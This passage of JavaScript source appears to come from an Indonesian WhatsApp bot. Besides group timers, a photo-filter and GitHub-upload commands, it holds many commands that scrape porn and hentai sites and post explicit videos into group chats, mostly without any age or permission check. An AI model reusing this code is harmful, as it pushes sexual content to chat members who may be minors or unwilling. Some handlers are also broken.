    await Izz.groupSettingUpdate(groupId, "announcement");
    m.reply(`🔒 Grup telah ditutup selama ${duration} menit.\nGrup akan dibuka kembali secara otomatis.`);

    // Timer untuk membuka kembali grup
    setTimeout(async () => {
        if (autoCloseDB[groupId]?.closed) {
            await Izz.groupSettingUpdate(groupId, "not_announcement");
            delete autoCloseDB[groupId];
            fs.writeFileSync(izzgcdb, JSON.stringify(autoCloseDB, null, 2));
            Izz.sendMessage(groupId, { text: "✅ Grup telah dibuka kembali!" });
        }
    }, duration * 60000);
}
break
case "set-timergc": {
    if (!isGroup) return m.reply("⚠️ Perintah ini hanya bisa digunakan di dalam grup.");
    if (!isBotAdmins) return m.reply("⚠️ Bot harus menjadi admin untuk mengubah pengaturan grup.");
    if (!isAdmins) return m.reply("⚠️ Hanya admin yang dapat menjalankan perintah ini.");

    let args = text.split(" ");
    if (args.length < 2) return m.reply("⚠️ Format salah! Contoh: .set-timergc 5.30 13.21");

    let openTime = formatTime(args[0]);
    let closeTime = formatTime(args[1]);

    let groupId = m.chat;

    // Simpan ke database
    timerGCDB[groupId] = { openTime, closeTime };
    fs.writeFileSync(Izztimer, JSON.stringify(timerGCDB, null, 2));

    m.reply(`✅ Timer grup telah diatur:\n📖 *Grup akan dibuka pada* ${args[0]} WIB\n🔒 *Grup akan ditutup pada* ${args[1]} WIB`);
    break;
}
break
case "stop-timergc": {
    if (!isGroup) return m.reply("⚠️ Perintah ini hanya bisa digunakan di dalam grup.");
    if (!isAdmins) return m.reply("⚠️ Hanya admin yang dapat menjalankan perintah ini.");

    let groupId = m.chat;

    if (!timerGCDB[groupId]) return m.reply("⚠️ Grup ini tidak memiliki timer aktif.");

    delete timerGCDB[groupId];
    fs.writeFileSync(Izztimer, JSON.stringify(timerGCDB, null, 2));

    m.reply("✅ Timer grup telah dihentikan. Grup tidak akan lagi dibuka/ditutup secara otomatis.");
}
break
case "xnxxsearchv2": {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("⚠️ Contoh penggunaan:\n.xnxxsearch japan");

    let query = text.trim();
    m.reply(`🔍 Mencari video XNXX untuk: *${query}*...`);

    try {
        let results = await xnxxsearch(query);

        if (typeof results === "string") return m.reply(results); // Jika error atau tidak ada hasil

        let responseText = `📌 *Hasil Pencarian XNXX: ${query}* 📌\n\n`;
        results.forEach((item, index) => {
            responseText += `🔸 *${index + 1}. ${item.title}*\n`;
            responseText += `⏳ *Durasi:* ${item.duration}\n`;
            responseText += `👀 *Views:* ${item.views} | ⭐ *Rating:* ${item.rating}\n`;
            responseText += `🔗 *Tonton:* [Klik Disini](${item.link})\n\n`;
        });

        await Izz.sendMessage(m.chat, { text: responseText }, { quoted: m });

        // Kirim thumbnail pertama sebagai sampel
        let firstResult = results[0];
        await Izz.sendMessage(m.chat, { image: { url: firstResult.thumbnail }, caption: `📺 *${firstResult.title}*\n🔗 *Tonton:* [Klik Disini](${firstResult.link})` }, { quoted: m });

    } catch (error) {
        console.error("❌ Error case xnxxsearch:", error);
        m.reply("⚠️ Terjadi kesalahan saat mencari video XNXX.");
    }
}
break
case "xnxxdownload": {
    if (!text) return m.reply("⚠️ Contoh penggunaan:\n.xnxxdownload <link_xnxx>");

    let url = text.trim();
    m.reply("⏳ Mengambil video dari XNXX...");

    try {
        let result = await xnxxcdn(url);

        if (result.error) return m.reply(result.error); // Jika error

        let caption = `📌 *XNXX Video Download* 📌\n\n`;
        caption += `🎬 *Judul:* ${result.title}\n`;
        caption += `⏳ *Durasi:* ${result.duration}\n`;
        caption += `👀 *Views:* ${result.views}\n`;
        caption += `📅 *Upload:* ${result.upload_date}\n`;
        caption += `🔗 *CDN Link:* [Download Video](${result.available_formats[0].url})`;

        // Kirim thumbnail + link CDN video
        await Izz.sendMessage(m.chat, { image: { url: result.thumbnail }, caption }, { quoted: m });

        // Kirim video langsung jika ukuran tidak terlalu besar
        await Izz.sendMessage(m.chat, { video: { url: result.available_formats[0].url }, caption: `🎬 *${result.title}*` }, { quoted: m });

    } catch (error) {
        console.error("❌ Error case xnxxdownload:", error);
        m.reply("⚠️ Terjadi kesalahan saat mengambil video dari XNXX.");
    }
  
}
break
case "phsearch": {
    if (!text) return m.reply("⚠️ Contoh penggunaan:\n.phsearch japan");

    let query = text.trim();
    m.reply(`🔍 Mencari video Pornhub untuk: *${query}*...`);

    try {
        let results = await pornhub(query);

        if (typeof results === "string") return m.reply(results); // Jika error atau tidak ada hasil

        let responseText = `📌 *Hasil Pencarian Pornhub: ${query}* 📌\n\n`;
        results.forEach((item, index) => {
            responseText += `🔸 *${index + 1}. ${item.title}*\n`;
            responseText += `⏳ *Durasi:* ${item.duration}\n`;
            responseText += `👀 *Views:* ${item.views} | ⭐ *Rating:* ${item.rating}\n`;
            responseText += `🔗 *Tonton:* [Klik Disini](${item.link})\n\n`;
        });

        await Izz.sendMessage(m.chat, { text: responseText }, { quoted: m });

        // Kirim thumbnail pertama sebagai sampel
        let firstResult = results[0];
        await Izz.sendMessage(m.chat, { image: { url: firstResult.thumbnail }, caption: `📺 *${firstResult.title}*\n🔗 *Tonton:* [Klik Disini](${firstResult.link})` }, { quoted: m });

    } catch (error) {
        console.error("❌ Error case phsearch:", error);
        m.reply("⚠️ Terjadi kesalahan saat mencari video Pornhub.");
    }
}
break
case "phdownload": {
    if (!text) return m.reply("⚠️ Contoh penggunaan:\n.phdownload <link_pornhub>");

    let url = text.trim();
    m.reply("⏳ Mengambil video dari Pornhub...");

    try {
        let result = await pornhubdownloader(url);

        if (result.error) return m.reply(result.error); // Jika error

        let caption = `📌 *Pornhub Video Download* 📌\n\n`;
        caption += `🎬 *Judul:* ${result.title}\n`;
        caption += `👤 *Uploader:* ${result.uploader}\n`;
        caption += `📅 *Upload:* ${result.upload_date}\n`;
        caption += `⏳ *Durasi:* ${result.duration}\n`;
        caption += `👀 *Views:* ${result.views}\n`;
        caption += `🔗 *CDN Link:* [Download Video](${result.available_formats[0].url})`;

        // Kirim thumbnail + link CDN video
        await Izz.sendMessage(m.chat, { image: { url: result.thumbnail }, caption }, { quoted: m });

        // Kirim video langsung jika ukuran tidak terlalu besar
        await Izz.sendMessage(m.chat, { video: { url: result.available_formats[0].url }, caption: `🎬 *${result.title}*` }, { quoted: m });

    } catch (error) {
        console.error("❌ Error case phdownload:", error);
        m.reply("⚠️ Terjadi kesalahan saat mengambil video dari Pornhub.");
    }
}
break
case 'tesph':{
await Izz.sendMessage(m.chat, { video: { url: `https://ev.phncdn.com/videos/202401/05/445957241/240P_1000K_445957241.mp4?validfrom=1742541361&validto=1742548561&rate=500k&burst=1400k&ip=152.53.91.197&ipa=152.53.91.197&hash=N%2Fusnh5IPq7OzgKskyuvrhvKsV0%3D` }, caption: `🎬` }, { quoted: m });
}
break
// Case dalam bot
case 'nhentai': {
    if (!text) return reply("❌ Masukkan judul atau ID doujin!\n\nContoh:\n.nhentai [judul]\n.nhentai [ID]");

    try {
        let nhentaiID;
        
        // Jika input adalah angka, berarti pengguna langsung memasukkan ID
        if (/^\d+$/.test(text)) {
            nhentaiID = text;
        } else {
            // Jika input berupa judul, cari ID terlebih dahulu
            await reply("🔍 Mencari ID berdasarkan judul...");
            nhentaiID = await getIDByTitle(text);
            if (!nhentaiID) return reply("❌ Tidak ditemukan ID untuk judul tersebut.");
        }

        // Ambil detail doujin berdasarkan ID
        await reply("📥 Mengambil informasi dari Nhentai...");
        let nhentaiData = await getNHentaiByID(nhentaiID);
        if (nhentaiData.error) return reply(`❌ Gagal mengambil data: ${nhentaiData.error}`);

        // Informasi yang akan dikirim
        let infoText = `📖 *Title:* ${nhentaiData.title}\n`;
        infoText += `🔢 *ID:* ${nhentaiData.id}\n`;
        infoText += `📅 *Upload:* ${nhentaiData.upload_date}\n`;
        infoText += `📚 *Pages:* ${nhentaiData.num_pages}\n`;
        infoText += `🏷 *Tags:* ${nhentaiData.tags.join(", ") || "N/A"}\n`;
        infoText += `🎨 *Artist:* ${nhentaiData.artist.join(", ") || "Unknown"}\n`;
        infoText += `🗂️ *Category:* ${nhentaiData.category.join(", ") || "Uncategorized"}\n`;
        infoText += `🌐 *Language:* ${nhentaiData.language.join(", ") || "Unknown"}\n`;

        // Kirim thumbnail dan informasi
        await Izz.sendMessage(m.chat, {
            image: { url: nhentaiData.thumb },
            caption: infoText
        }, { quoted: m });

        // Convert pages menjadi PDF
        await reply("📄 Mengonversi halaman menjadi PDF, harap tunggu...");
        let pdfBuffer = await convertImagesToPDF(nhentaiData.pages);
        
        // Kirim file PDF
        await Izz.sendMessage(m.chat, {
            document: pdfBuffer,
            fileName: `Nhentai-${nhentaiData.id}.pdf`,
            mimetype: 'application/pdf',
            caption: "📄 Doujin telah dikonversi ke PDF."
        }, { quoted: m });

    } catch (error) {
        console.error("❌ Error dalam case nhentai:", error.message);
        reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break
case 'xhamstersearch': {
    if (!text) return reply('Silakan masukkan kata kunci untuk pencarian.\nContoh: .xhamstersearch jav');

    reply('🔍 Sedang mencari video...');

    scrapeXhamster(text)
        .then(results => {
            if (!results.length) return reply('❌ Tidak ditemukan hasil untuk pencarian tersebut.');

            let message = '🔎 *Hasil pencarian xHamster:*\n\n';
            results.slice(0, 5).forEach((video, index) => {
                message += `*${index + 1}. ${video.title}*\n`;
                message += `📹 *Durasi:* ${video.duration}\n`;
                message += `👁️ *Dilihat:* ${video.views}\n`;
                message += `🔗 *Link:* ${video.link}\n\n`;
            });

            reply(message);
        })
        .catch(error => {
            console.error(error);
            reply('❌ Terjadi kesalahan saat melakukan pencarian.');
        });
        }
    
    break
    case 'xhamsterdl': {
    if (!text) return reply('Silakan masukkan link video xHamster.\nContoh: .xhamsterdl https://xhamster.com/videos/...');

    xhamsterDownload(text).then(downloadUrl => {
        if (!downloadUrl) {
            reply('Maaf, tidak dapat menemukan link unduhan.');
            return;
        }

        Izz.sendMessage(m.chat, { 
            video: { url: downloadUrl },
            caption: 'Berikut adalah video yang Anda minta.'
        }, { quoted: m });
    }).catch(error => {
        reply('Terjadi kesalahan saat mengunduh video.');
        console.error(error);
    });
    }
break
// Implementasi ke dalam case switch
case 'xvideos':{
    if (!text) return reply('Masukkan kata kunci pencarian!\nContoh: .xvideos asian');

    xvideosSearch(text)
        .then(results => {
            if (typeof results === 'string') return reply(results);

            let message = `🔞 *Hasil Pencarian Xvideos:* 🔞\n\n`;
            results.forEach((video, i) => {
                message += `*${i + 1}. ${video.title}*\n`;
                message += `⏱ Durasi: ${video.duration}\n`;
                message += `👀 Views: ${video.views}\n`;
                message += `🔗 [Tonton Video](${video.link})\n\n`;
            });

            Izz.sendMessage(m.chat, { text: message }, { quoted: m });
        })
        .catch(err => {
            reply('Terjadi kesalahan dalam mengambil data.');
            console.error(err);
        });
  }
  break
  case 'ypsearch': {
    if (!text) return reply('Masukkan kata kunci pencarian!\nContoh: .ypsearch jordi');

    ypsearch(text)
        .then(results => {
            if (!Array.isArray(results)) return reply(results); // Jika hasil berupa string error

            let message = `🔞 *Hasil Pencarian YouPorn:* 🔞\n\n`;
            results.forEach((video, i) => {
                message += `*${i + 1}. ${video.title}*\n`;
                message += `⏱ Durasi: ${video.duration}\n`;
                message += `📷 Thumbnail: ${video.thumbnail}\n`;
                message += `🔗 *Gunakan:* .ypdl ${video.link}\n\n`;
            });

            Izz.sendMessage(m.chat, { text: message }, { quoted: m });
        })
        .catch(err => {
            reply('Terjadi kesalahan dalam mengambil data.');
            console.error(err);
        });
   }
    break;
case 'ypdl': {
    if (!text) return reply('Masukkan link video dari YouPorn!\nContoh: .ypdl https://www.youporn.com/watch/102951071');

    ypdown(text)
        .then(async (result) => {
            if (result.error) return reply(result.error);

            let message = `🎥 *Download YouPorn*\n\n`;
            message += `*Judul:* ${result.title}\n`;
            message += `⏱ Durasi: ${result.duration}\n`;
            message += `👀 Views: ${result.views}\n`;
            message += `📷 Thumbnail: ${result.thumbnail}\n\n`;
            message += `🔗 *Link Download:*\n`;

            result.available_formats.forEach((link, i) => {
                message += `🎬 *${link.format}* → [Download](${link.url})\n`;
            });

            // Kirim informasi awal + thumbnail
            Izz.sendMessage(m.chat, {
                image: { url: result.thumbnail },
                caption: message
            }, { quoted: m });

            // Pilih resolusi terbaik untuk diunduh
            let bestQuality = result.available_formats.find(f => f.format.includes('mp4')) || result.available_formats[0];

            if (!bestQuality) return reply('⚠️ Tidak ada format video yang tersedia.');

            let outputPath = `./downloads/${Date.now()}.mp4`;

            reply("⏳ Sedang mengunduh video, mohon tunggu...");

            try {
                await downloadVideo(bestQuality.url, outputPath);

                // Kirim video ke WhatsApp
                Izz.sendMessage(m.chat, {
                    video: fs.readFileSync(outputPath),
                    caption: `🎥 *${result.title}*`
                }, { quoted: m });

                // Hapus file setelah dikirim
                fs.unlinkSync(outputPath);
            } catch (err) {
                reply("⚠️ Gagal mengunduh video.");
                console.error(err);
            }

        })
        .catch(err => {
            reply('Terjadi kesalahan dalam mengambil link download.');
            console.error(err);
        });
    }
    break
    case 'pornhubdl':{
    if (!text) return reply('Masukkan link video dari Pornhub!\nContoh: .pornhubdl https://www.pornhub.com/view_video.php?viewkey=ph5f4e4b2a7e7d8');

    pornhubdl(text)
        .then(async (result) => {
            if (result.error) return reply(result.error);

            let message = `🎥 *Download Pornhub*\n\n`;
            message += `*Judul:* ${result.title}\n`;
            message += `⏱ Durasi: ${result.duration}\n`;
            message += `👀 Views: ${result.views}\n`;
            message += `📷 Thumbnail: ${result.thumbnail}\n\n`;
            message += `🔗 *Link Download:*\n`;

            result.available_formats.forEach((link, i) => {
                message += `🎬 *${link.format}* → [Download](${link.url})\n`;
            });

            // Kirim thumbnail + pesan
            Izz.sendMessage(m.chat, {
                image: { url: result.thumbnail },
                caption: message
            }, { quoted: m });

            // Pilih resolusi terbaik untuk diunduh
            let bestQuality = result.available_formats.find(f => f.format.includes('mp4')) || result.available_formats[0];

            if (!bestQuality) return reply('⚠️ Tidak ada format video yang tersedia.');

            let outputPath = `./downloads/${Date.now()}.mp4`;

            reply("⏳ Sedang mengunduh video, mohon tunggu...");

            try {
                await downloadVideoph(bestQuality.url, outputPath);

                // Kirim video ke WhatsApp
                Izz.sendMessage(m.chat, {
                    video: fs.readFileSync(outputPath),
                    caption: `🎥 *${result.title}*`
                }, { quoted: m });

                // Hapus file setelah dikirim
                fs.unlinkSync(outputPath);
            } catch (err) {
                reply("⚠️ Gagal mengunduh video.");
                console.error(err);
            }

        })
        .catch(err => {
            reply('Terjadi kesalahan dalam mengambil link download.');
            console.error(err);
        });
    }
    break
    case 'reactchv2': { 
                if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029Vawm0Vp5Ejy1kfjJdD2S/260 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                Izz.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    Izz.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
            }
break;
case 'toghibli': {
const { Buffer } = require('buffer');
const axios = require('axios');
  try {
    // Cek apakah ada gambar yang dikutip/dikirim
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
    
    if (!mime) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
    if (!/image\/(jpe?g|png)/.test(mime)) return m.reply('Hanya format JPEG/PNG yang didukung!');
    
    // Download gambar
    const media = await q.download();
    const base64Image = media.toString('base64');
    
    // Tandai sedang memproses
    await m.reply('⏳ Sedang mengubah gaya gambar menjadi Ghibli...');
    
    // Request ke API
    const payload = {
      imageUrl: `data:image/jpeg;base64,${base64Image}`
    };
    
    const { data } = await axios.post(
      'https://ghibliai-worker.ahmadjandal.workers.dev/generate',
      payload,
      {
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 60000 // Timeout 1 menit
      }
    );
    
    if (!data?.result) throw 'Gagal memproses gambar, coba gambar lain';
    
    // Konversi base64 ke buffer
    const base64Data = data.result.replace(/^data:image\/\w+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');
    
    // Kirim gambar hasil
    await conn.sendMessage(m.chat, {
      image: imageBuffer,
      caption: '🎨 *Gambar Ghibli Style*',
      mentions: [m.sender]
    }, {
      quoted: m
    });
    
  } catch (error) {
    console.error('Error:', error);
    let errorMessage = 'Gagal memproses gambar';
    if (error.response) {
      errorMessage += ` (${error.response.status})`;
      if (error.response.data?.message) {
        errorMessage += `: ${error.response.data.message}`;
      }
    } else {
      errorMessage += `: ${error.message}`;
    }
    await m.reply(errorMessage);
  }
};
  break;
  case 'squirt': {
  const xnxx = require('xnxx-scraper')

    try {
      // 1) jalankan pencarian
      const response = await xnxx.search('squirt')
      // 2) ambil 5 pertama dari array result
      const top5 = Array.isArray(response.result)
        ? response.result.slice(0, 5)
        : []

      // 3) siapkan rows untuk interactiveButtons
      const rows = top5.map((vid, idx) => ({
        title: `${idx+1}. ${vid.title}`,
        rowId: `xnxx_play_${encodeURIComponent(vid.link)}`,
        description: vid.link
      }))

      await Izz.sendMessage(m.chat, { text: rows }, { quoted: null })
    } catch (err) {
      console.error(err)
      await Izz.sendMessage(from, { text: '⚠️ Gagal mengambil data dari xnxx-scraper.' }, { quoted: null })
    }
    
  }
  break
  case 'xnxxsrcv2': {
  const xnxx = require('xnxx-scraper')

    // Optional: beri feedback loading
    await Izz.sendMessage(from, { text: '🔍 Sedang mencari di xnxx...' }, { quoted: m })

    // Ambil kata kunci dari args, default 'squirt'
    const query = args.length ? args.join(' ') : 'squirt'

    try {
      // Panggil scraper
      const response = await xnxx.search(query)
      const results = Array.isArray(response.result) ? response.result.slice(0, 20) : []

      // Bangun string balasan
      let reply = `*Hasil Pencarian "${query}" (Top ${results.length})*\n\n`
      if (!results.length) {
        reply += '_Maaf, tidak ada hasil untuk kata kunci itu._'
      } else {
        results.forEach((vid, i) => {
          reply += `*${i + 1}.* ${vid.title}\n${vid.link}\n\n`
        })
      }

      // Kirim balasan
      await Izz.sendMessage(from, { text: reply }, { quoted: m })
    } catch (err) {
      console.error('xnxx-scraper error:', err)
      await Izz.sendMessage(
        from,
        { text: '⚠️ Gagal mengambil data dari xnxx-scraper.' },
        { quoted: m }
      )
    }
    
  }
  break
  case 'xnxxdownv2': {
  const { xnxxSearch, xnxxDownload } = require('@mr.janiya/xnxx-scraper');

  // 1. Loading notice
  await Izz.sendMessage(from, { text: '🔄 Mengunduh detail video dari xnxx...' }, { quoted: m })

  // 2. Ambil URL dari args
  const url = args[0]
  if (!url || !url.startsWith('http')) {
    return await Izz.sendMessage(from, {
      text: '⚠️ Mohon sertakan URL video xnxx. Contoh:\n\nxnxxdownv2 https://www.xnxx.com/video-xxxxx'
    }, { quoted: m })
  }

  try {
    // 3. Panggil downloader
    const data = await xnxxDownload(url)
    const info = data.result

    // 4. Siapkan caption
    let caption = `*${info.title}*\n`
    caption += `📌 URL: ${info.URL}\n`
    caption += `⏱ Durasi: ${info.duration}s\n`
    caption += `ℹ️ Info: ${info.info.replace(/\\t/g, ' ')}\n\n`
    caption += `*Link Unduhan:*\n`
    // files: low, high, HLS
    if (info.files.low) caption += `• Low Quality: ${info.files.low}\n`
    if (info.files.high) caption += `• High Quality: ${info.files.high}\n`
    if (info.files.HLS) caption += `• HLS Stream: ${info.files.HLS}\n`

    // 5. Kirim thumbnail + caption
    await Izz.sendMessage(from, {
      image: { url: info.image },
      caption
    }, { quoted: m })
await Izz.sendMessage(m.chat, {
video: { url: info.files.high }, caption: `Video Nya` }, { quoted: null })
  } catch (err) {
    console.error('xnxxDownload error:', err)
    await Izz.sendMessage(from, {
      text: '❌ Gagal mengambil detail video dari xnxx-scraper.'
    }, { quoted: m })
  }
 
}
break
case 'getinfo': {
const { xnxxSearch, xnxxDownload } = require('@mr.janiya/xnxx-scraper');

  // 1. Loading notice
  await Izz.sendMessage(from, { text: '🔄 Mengunduh detail video dari xnxx...' }, { quoted: m })

  // 2. Ambil URL dari args
  const url = args[0]
  if (!url || !url.startsWith('http')) {
    return await Izz.sendMessage(from, {
      text: '⚠️ Mohon sertakan URL video xnxx. Contoh:\n\nxnxxdownv2 https://www.xnxx.com/video-xxxxx'
    }, { quoted: m })
  }
    try {
    // 3. Panggil downloader
    const data = await xnxxDownload(url)
    const info = data.result

    // 4. Siapkan caption
    let caption = `*${info.title}*\n`
    caption += `📌 URL: ${info.URL}\n`
    caption += `⏱ Durasi: ${info.duration}s\n`
    caption += `ℹ️ Info: ${info.info.replace(/\\t/g, ' ')}\n\n`
    // 5. Kirim thumbnail + caption
    await Izz.sendMessage(from, {
      image: { url: info.image },
      caption
    }, { quoted: m })
  } catch (err) {
    console.error('xnxxDownload error:', err)
    await Izz.sendMessage(from, {
      text: '❌ Gagal mengambil detail video dari xnxx-scraper.'
    }, { quoted: m })
  }
  }
break
case 'phbsearch': {
const { phsearch, phdl } = require('darksadas-yt-pornhub-scrape')
  // 1) Info ke user bahwa scraping dimulai
  await Izz.sendMessage(from, { text: '🔍 Mencari video di Pornhub…' }, { quoted: m })

  // 2) Ambil kata kunci, default "pussy"
  const queryPH = args.length ? args.join(' ') : 'pussy'

  try {
    // 3) Panggil scraper
    const allResults = await phsearch(queryPH)
    // Struktur hasil: [{ title, image, link }, …]
    const top5 = Array.isArray(allResults) ? allResults.slice(0, 5) : []

    // 4) Buat balasan teks
    let reply = `*Hasil Pencarian Pornhub "${queryPH}" (Top ${top5.length})*\n\n`
    if (!top5.length) {
      reply += '_Maaf, tidak ada hasil ditemukan._'
    } else {
      top5.forEach((vid, i) => {
        reply += `*${i + 1}.* ${vid.title}\n${vid.link}\n\n`
      })
    }

    // 5) Kirim sebagai teks biasa
    await Izz.sendMessage(from, { text: reply }, { quoted: m })
  } catch (err) {
    console.error('phsearch error:', err)
    await Izz.sendMessage(
      from,
      { text: '⚠️ Gagal mengambil data dari Pornhub.' },
      { quoted: m }
    )
  }
  
}
  break
case 'uptogithub': {
  const nameArg = args.join(" ").trim();
  const reply = m.quoted || m.reply_message;
  const axios = require('axios');
  const unzipper = require('unzipper');
  const { downloadMediaMessage } = require('baileys');

  if (!nameArg) return Izz.sendMessage(from, { text: `Penggunaan: ${prefix}uptogithub <namaRepo>` }, { quoted: m });
  if (!reply || !reply.mimetype || !reply.fileSha256) return Izz.sendMessage(from, { text: '❌ Reply file .zip untuk diunggah ke GitHub.' }, { quoted: m });

  const repoName = nameArg.toLowerCase().replace(/[^a-z0-9-_]/g, '') + '-website';

  let buffer;
  try {
    buffer = await downloadMediaMessage(reply, 'buffer', {}, { reuploadRequest: Izz });
  } catch (e) {
    console.error('Download media error:', e);
    return Izz.sendMessage(from, { text: '❌ Gagal mendownload file (downloadMediaMessage gagal).' }, { quoted: m });
  }

  const rawToken = global.githubToken || '';
  const authHeader = rawToken.startsWith('ghp_') || rawToken.startsWith('ghu_') ? `token ${rawToken}` : `Bearer ${rawToken}`;
  const axiosGit = axios.create({
    baseURL: 'https://api.github.com',
    headers: {
      Authorization: authHeader,
      'Content-Type': 'application/json',
      'User-Agent': global.githubUsername
    }
  });

  try {
    await axiosGit.post('/user/repos', {
      name: repoName,
      private: true,
      auto_init: true,
      gitignore_template: 'Node'
    });
  } catch (e) {
    const status = e.response?.status;
    const message = e.response?.data?.message;
    if (status === 401) return Izz.sendMessage(from, { text: '❌ Token GitHub tidak valid.' }, { quoted: m });
    if (status === 422) return Izz.sendMessage(from, { text: `❌ Repositori *${repoName}* sudah ada.` }, { quoted: m });
    return Izz.sendMessage(from, { text: `❌ Gagal membuat repositori: ${message || status}` }, { quoted: m });
  }

  const files = [];
  try {
    const directory = await unzipper.Open.buffer(buffer);
    for (const file of directory.files) {
      if (file.type === 'File') {
        const content = await file.buffer();
        files.push({
          path: file.path.replace(/^\/+/g, '').replace(/\\/g, '/'),
          content: content.toString('base64')
        });
      }
    }
  } catch (e) {
    return Izz.sendMessage(from, { text: '❌ File harus berupa .zip yang valid.' }, { quoted: m });
  }

  try {
    for (const f of files) {
      await axiosGit.put(`/repos/${global.githubUsername}/${repoName}/contents/${encodeURIComponent(f.path)}`, {
        message: `Add ${f.path}`,
        content: f.content
      });
    }
  } catch (e) {
    return Izz.sendMessage(from, { text: `❌ Upload gagal: ${e.response?.data?.message || e.message}` }, { quoted: m });
  }

  const liveUrl = `https://${global.githubUsername}.github.io/${repoName}`;
  return Izz.sendMessage(from, { text: `✅ Upload sukses ke GitHub:\n${liveUrl}` }, { quoted: m });
}


break
  case 'xdown': {
  const url = args[0]
  if (!url || !url.startsWith('http')) {
    return Izz.sendMessage(
      from,
      { text: '⚠️ Format: .xdown <link_video>\nContoh: .xdown https://www.xnxx.com/video-xxxxx' },
      { quoted: m }
    )
  }
  await Izz.sendMessage(from, { text: '⏳ Memproses unduhan via SaveTheVideo API…' }, { quoted: m })

  // helper untuk delay
  const delay = ms => new Promise(res => setTimeout(res, ms))

  let info
  try {
    // coba 1x panggil API
    info = await xnxxcdn(url)
    // jika error atau retry flag, tunggu dan ulangi sekali
    if (info.error === 'Too Many Requests' || info.error === '⚠️ URL tidak valid! Harus berasal dari XNXX.') {
      await delay(5000)  // tunggu 5s
      info = await xnxxcdn(url)
    }
  } catch (e) {
    info = { error: e.message }
  }

  // kalau masih error
  if (info.error) {
    const msg =
      info.error.includes('Too Many Requests')
        ? '⚠️ Service sedang sibuk (rate limit). Coba lagi beberapa saat lagi.'
        : `❌ Gagal: ${info.error}`
    return Izz.sendMessage(from, { text: msg }, { quoted: m })
  }

  // ambil format tertinggi
  const formats = info.available_formats
  const best = formats[formats.length - 1]
  try {
    // download video
    const res = await axios.get(best.url, { responseType: 'arraybuffer' })
    const videoBuffer = Buffer.from(res.data)
    // kirim metadata dan thumbnail kalau ada
    let cap = `*${info.title}*\n` +
              `⏱ Durasi: ${info.duration}\n` +
              `👁️ Views: ${info.views}\n` +
              `🔗 Format: ${best.format}\n\n` +
              `Mengirim video…`
    if (info.thumbnail) {
      await Izz.sendMessage(from, { image: { url: info.thumbnail }, caption: cap }, { quoted: m })
    }
    await Izz.sendMessage(from, {
      video: videoBuffer,
      mimetype: 'video/mp4',
      fileName: `video_${best.format.replace(/\s+/g, '_')}.mp4`
    }, { quoted: m })
  } catch (err) {
    console.error('xdown download error:', err)
    await Izz.sendMessage(from, { text: '❌ Gagal mengunduh video dari URL format.' }, { quoted: m })
  }

}
break
case 'xsrc': {
  // 1) Feedback loading
  const xnxx = require('xnxx-scraper')
  await Izz.sendMessage(from, { text: '🔍 Mencari di xnxx...' }, { quoted: m })

  // 2) Ambil query
  const query = args.length ? args.join(' ') : 'squirt'

  try {
    // 3) Panggil scraper
    const response = await xnxx.search(query)
    // Ambil maksimal 20 hasil
    const items = Array.isArray(response.result)
      ? response.result.slice(0, 20)
      : []

    // 4) Siapkan rows untuk NativeFlow
    const rows = items.map((vid, idx) => ({
      header: `${idx + 1}`,
      title: vid.title.substring(0, 20),
      description: vid.link,
      id: `gxnxx ${vid.link}`
    }))

    // 5) Kirim pesan hanya dengan NativeFlow single_select
    await Izz.sendMessage(from, {
      text: `*Hasil Pencarian "${query}" (Top ${items.length})*\nPilih video untuk diunduh:`,
      footer: '© NIH RESULT NYA',
      headerType: 1,
      viewOnce: true,
      buttons: [
        {
          buttonId: 'xnxxsrcv2_native',
          buttonText: { displayText: '📥 Daftar Unduhan' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Video untuk Diunduh',
              sections: [
                {
                  title: `Hasil "${query}"`,
                  highlight_label: '🔗',
                  rows
                }
              ]
            })
          }
        }
      ]
    }, { quoted: m })

  } catch (err) {
    console.error('xnxx-scraper error:', err)
    await Izz.sendMessage(
      from,
      { text: '⚠️ Gagal mengambil data dari xnxx-scraper.' },
      { quoted: m }
    )
  }
  
}
break
case 'gxnxx': {
const { xnxxSearch, xnxxDownload } = require('@mr.janiya/xnxx-scraper');

  // 1. Loading notice
  await Izz.sendMessage(from, { text: '🔄 Mengunduh detail video dari xnxx...' }, { quoted: m })

  // 2. Ambil URL dari args
  const url = args[0]
  if (!url || !url.startsWith('http')) {
    return await Izz.sendMessage(from, {
      text: '⚠️ Mohon sertakan URL video xnxx. Contoh:\n\nxnxxdownv2 https://www.xnxx.com/video-xxxxx'
    }, { quoted: m })
  }
    try {
    // 3. Panggil downloader
    const data = await xnxxDownload(url)
    const info = data.result

    // 4. Siapkan caption
    let caption = `*${info.title}*\n`
    caption += `📌 URL: ${info.URL}\n`
    caption += `⏱ Durasi: ${info.duration}s\n`
    caption += `ℹ️ Info: ${info.info.replace(/\\t/g, ' ')}\n\n`
    // 5. Kirim thumbnail + caption
    const buttons = [
  { buttonId: `.xnxxdownv2 ${info.URL}`, buttonText: { displayText: 'DOWNLOAD' }, type: 1 }
]

const buttonMessage = {
    image: { url: info.image }, // image: buffer or path
    caption,
    footer: 'nih hasil nya',
    buttons,
    headerType: 1,
    viewOnce: true
}

await Izz.sendMessage(m.chat, buttonMessage, { quoted: null })

  } catch (err) {
    console.error('xnxxDownload error:', err)
    await Izz.sendMessage(from, {
      text: '❌ Gagal mengambil detail video dari xnxx-scraper.'
    }, { quoted: m })
  }
  
  }
break 
 case 'runbot': {
  // 0) Validasi owner & reply berupa ZIP
  if (!isOwner) return reply('⚠️ Hanya owner yang bisa menjalankan perintah ini.')
  if (!qmsg || !qmsg.mimetype?.includes('zip')) {
